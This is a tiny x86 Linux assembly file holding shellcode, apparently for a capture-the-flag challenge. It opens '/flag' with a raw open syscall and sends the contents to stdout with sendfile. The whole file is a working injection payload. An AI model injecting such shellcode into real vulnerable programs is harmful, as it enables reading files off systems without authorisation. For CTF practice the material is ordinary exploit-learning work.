.intel_syntax noprefix

.global _start
_start:

push 0x67
push 0x616c662f
xor eax, eax
mov al, 0x5
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
mov ecx, eax
xor eax, eax
mov al, 0x64
mov esi, eax
xor eax, eax
mov al, 0xbb
xor ebx, ebx
mov bl, 0x1
xor edx, edx
int 0x80

